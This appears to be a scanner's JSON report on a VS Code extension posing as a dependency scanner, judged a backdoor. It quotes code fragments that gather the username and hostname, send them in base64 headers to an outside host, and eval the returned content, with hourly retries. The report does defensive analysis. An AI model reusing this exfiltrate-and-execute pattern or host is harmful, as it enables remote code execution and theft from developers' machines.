@@ -1,0 +1,162 @@
+{
+  "extension_id": "CodeSecureDev.dependency-scan",
+  "display_name": "Dependency Scan",
+  "version": "1.8.12",
+  "publisher": {
+    "name": "CodeSecureDev",
+    "verified": false
+  },
+  "vsix_sha256": "885fcba824684a7d68dea33837ed60eefe15612fd3ea47fb5359f211d529f75b",
+  "verdict": "HIGH-RISK",
+  "confirmation_basis": [
+    "composite_score",
+    "marketplace_removal",
+    "critical_static_finding"
+  ],
+  "confidence": 0.8999999999999999,
+  "scores": {
+    "composite": 1.0,
+    "ai_vibe": 1.0,
+    "static": 0.5106203125901445,
+    "behavioral": 0.0,
+    "trust_signal": 1.0,
+    "campaign": 0.0
+  },
+  "findings": {
+    "critical": [
+      {
+        "check": "infostealer_behavior",
+        "severity": "CRITICAL",
+        "description": "System fingerprinting API call",
+        "file": "extension/extension.js",
+        "line": 55,
+        "snippet": "os.platform()"
+      },
+      {
+        "check": "infostealer_behavior",
+        "severity": "CRITICAL",
+        "description": "System fingerprinting API call",
+        "file": "extension/extension.js",
+        "line": 57,
+        "snippet": "os.userInfo()"
+      },
+      {
+        "check": "infostealer_behavior",
+        "severity": "CRITICAL",
+        "description": "System fingerprinting API call",
+        "file": "extension/extension.js",
+        "line": 58,
+        "snippet": "os.hostname()"
+      }
+    ],
+    "high": [
+      {
+        "check": "RISKY_API_CALL",
+        "severity": "HIGH",
+        "description": "Found 'eval(' pattern",
+        "file": "extension/extension.js",
+        "line": 95,
+        "snippet": "eval(data.toString());"
+      }
+    ],
+    "total": 9
+  },
+  "extracted_references": [
+    {
+      "type": "domain",
+      "value": "resources.jsdelivr.cloud",
+      "source_file": "extension/extension.js",
+      "line": 92,
+      "context": "const req = https.get(\"https://resources.jsdelivr.cloud/api/license\", options);",
+      "vt_detections": 0,
+      "reputation": "unknown"
+    }
+  ],
+  "extracted_references_notes": {
+    "withheld_dependency_metadata": 0,
+    "truncated": 0,
+    "what_this_is": "Domains, URLs and filenames found in the package text. NOT confirmed attacker infrastructure and NOT safe to auto-blocklist -- a URL in a code comment appears here too. Use it as a starting point for analysis, and check vt_detections/reputation before acting.",
+    "rule": "References extracted from node_modules are excluded: they describe a dependency, not this extension. Deduplicated on (type, value)."
+  },
+  "ioc_enrichment": [],
+  "shared_infrastructure": {},
+  "ai_analysis": {
+    "verdict": "MALICIOUS",
+    "risk_score": 1.0,
+    "confidence": 0.98,
+    "blocks_parsed": 1,
+    "blocks_seen": 1,
+    "summaries": [
+      {
+        "target": "extension/extension.js",
+        "summary": "This extension is a malicious backdoor disguised as a dependency scanner. It does not perform any dependency scanning. Instead, it harvests system information (username, hostname, platform) and sends it to a remote server. It then fetches a URL from that server and executes the returned content using eval(), allowing the attacker to run arbitrary code on the user's machine. The code also includes persistence mechanisms to re-attempt the connection if it fails. This is a critical security threat."
+      }
+    ],
+    "findings": [
+      {
+        "severity": "CRITICAL",
+        "category": "CAPABILITY_DISCONNECT",
+        "description": "The extension claims to scan dependencies but performs no such action. Instead, it collects system information and executes remote code. The 'scan' command is a fake progress bar that does nothing.",
+        "code_reference": "vscode.commands.registerCommand('dependency-scan.scan', ...)",
+        "line_hint": 28,
+        "target": "extension/extension.js"
+      },
+      {
+        "severity": "CRITICAL",
+        "category": "CREDENTIAL_HARVESTING",
+        "description": "The code harvests sensitive system information including username, hostname, platform, and user domain, and sends them to a remote server in Base64 encoded headers.",
+        "code_reference": "const userInfo = os.userInfo(); const machineName = os.hostname(); ... headers = { \"X-ApiKey-Alpha\": b64(userInfo.username), ... }",
+        "line_hint": 57,
+        "target": "extension/extension.js"
+      },
+      {
+        "severity": "CRITICAL",
+        "category": "REMOTE_CODE_EXECUTION",
+        "description": "The extension fetches a URL from a remote server and executes the response using eval(). This is a classic backdoor pattern allowing the attacker to run arbitrary code on the user's machine.",
+        "code_reference": "https.get(apiUrl, function(res) { res.on('data', function(data) { stopInterval(); eval(data.toString()); }); });",
+        "line_hint": 98,
+        "target": "extension/extension.js"
+      },
+      {
+        "severity": "HIGH",
+        "category": "PERSISTENCE",
+        "description": "The extension sets up a recurring interval to re-attempt the malicious connection every hour if the initial request fails or is denied, ensuring persistent access.",
+        "code_reference": "scanInterval = setInterval(runLicenseCheck, 60 * 1000); ... setTimeout(attemptRequest, 60 * 60 * 1000);",
+        "line_hint": 10,
+        "target": "extension/extension.js"
+      },
+      {
+        "severity": "MEDIUM",
+        "category": "BEHAVIORAL_MISMATCH",
+        "description": "The extension activates on 'onStartupFinished', which is unnecessary for a manual scan command and allows the malicious code to run immediately upon VS Code startup.",
+        "code_reference": "Activation Events: onStartupFinished",
+        "line_hint": null,
+        "target": "extension/extension.js"
+      }
+    ],
+    "findings_truncated": 0
+  },
+  "ai_summary": "This extension is a malicious backdoor disguised as a dependency scanner. It does not perform any dependency scanning. Instead, it harvests system information (username, hostname, platform) and sends it to a remote server. It then fetches a URL from that server and executes the returned content using eval(), allowing the attacker to run arbitrary code on the user's machine. The code also includes persistence mechanisms to re-attempt the connection if it fails. This is a critical security threat.",
+  "escalation_reasons": [
+    "3 CRITICAL findings",
+    "Composite risk 0.60 >= 0.5",
+    "AI verdict: MALICIOUS"
+  ],
+  "virustotal": {
+    "malicious": 0,
+    "total_engines": 0,
+    "known_malicious": false
+  },
+  "marketplace": {
+    "install_count": 1,
+    "published_date": "2026-04-15T09:01:02.94Z",
+    "removed_by_microsoft": true,
+    "removal_type": "Malware"
+  },
+  "analysis_coverage": {
+    "partial": false,
+    "excluded_phases": [],
+    "ai_phase_ran": true
+  },
+  "scanned_at": "2026-09-12T22:12:03.533545+00:00Z"
+}
